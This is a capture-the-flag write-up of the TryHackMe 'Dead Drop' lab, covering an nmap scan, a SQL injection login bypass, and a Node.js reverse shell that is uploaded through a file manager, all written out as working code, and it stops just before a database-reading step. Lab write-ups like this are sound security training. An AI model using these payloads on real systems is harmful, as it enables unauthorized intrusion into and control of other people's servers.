<img width="1772" height="247" alt="image" src="https://github.com/user-attachments/assets/fcffbf65-62f0-49d6-9f53-0e5359c59b17" />

# TryHackMe - Dead Drop Write-up

<img width="992" height="587" alt="image" src="https://github.com/user-attachments/assets/c4127afc-66a3-429e-a96a-23615e9bc7c4" />

<br>


Web server / DMZ: directly accessible from VPN
Internal LAN: 192.168.11.0/24

`Internal hosts shown:
DEADDROP-DC → 192.168.11.100
DEADDROP-WRK → 192.168.11.51
WebServer → 192.168.11.200`

So first goal: compromise the web server and get SSH creds.

### Start with nmap:

```nmap -sC -sV -Pn -oN deaddrop-web.nmap 192.168.11.200```

<img width="1349" height="416" alt="image" src="https://github.com/user-attachments/assets/9812f013-dc88-48ae-b0c4-e03dfce32528" />
<br>

Web server is simple:

```
22 SSH
80 Node.js Express app
/login
```

So first target is the Node.js. SSH password likely comes from web exploit/leak. 🧭

In browser, open:
```
http://192.168.11.200/login
```

<img width="1358" height="864" alt="image" src="https://github.com/user-attachments/assets/11b6d74a-1f4a-45bc-9428-47d8771b9794" />
<br>

Then test common auth bypasses:

Payload used:
```
username=admin'--&password=x
```
<img width="1370" height="856" alt="image" src="https://github.com/user-attachments/assets/55dca5c1-8e63-4a96-aa8f-fa6f78451cc4" />

<img width="1898" height="863" alt="image" src="https://github.com/user-attachments/assets/d4bcc6a1-fad1-4760-8cbf-edfa840c107c" />

<br>

That confirms SQL injection login bypass worked ✅

Meaning the backend query is probably something like:

```
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'
```

The `--` comments out the password check, so you are logged in as admin.

## Notes on Testing

I also tested a few other possibilities before finding the working path. Path traversal in the preview and rename functions did not work because the application appeared to sanitize filenames and strip directory traversal characters. SSTI payloads were also displayed as plain text, so the preview page was not evaluating template syntax.

Since the server was running Node.js Express, this helped narrow the path toward using a Node.js reverse shell payload instead.

## Getting a Reverse Shell

After that, I tested the upload and preview functionality. At first, I looked at the existing `rev.php` file and considered using a PHP reverse shell. However, the application was running on Node.js Express, and PHP files were only displayed as text in the preview page instead of being executed.

Since PHP was not being interpreted by the server, I shifted the test toward the application’s actual backend technology: Node.js. 

For a Node.js reverse shell, create rev.js with your VPN IP:

```
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4444, "YOUR_VPN_IP", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
})();
```

Start a Listener:

```bash
nc -lvnp 4444
```

I then uploaded rev.js through the file manager. After the file appeared in the dashboard, I clicked Preview on the uploaded file. This triggered the JavaScript file on the server side and caused the target to connect back to my listener.

Once the connection came in, I confirmed the shell:

<img width="1346" height="158" alt="image" src="https://github.com/user-attachments/assets/9d0ab6bc-bb64-408e-8103-62542425a740" />

<br>

```bash
whoami
```
The shell was running as the node user, which confirmed code execution through the uploaded Node.js reverse shell.

<img width="1349" height="506" alt="image" src="https://github.com/user-attachments/assets/af4a5fb2-9f17-45bb-b6d8-78863a9afc26" />

<img width="1349" height="112" alt="image" src="https://github.com/user-attachments/assets/1bb61602-d7d5-43ad-a93b-35d61c534e37" />

sqlite3 is not installed on the target, but that’s okay. You have a few easy options.

Best option: use Node.js since the app already has sqlite packages installed.

From /opt/app, run:








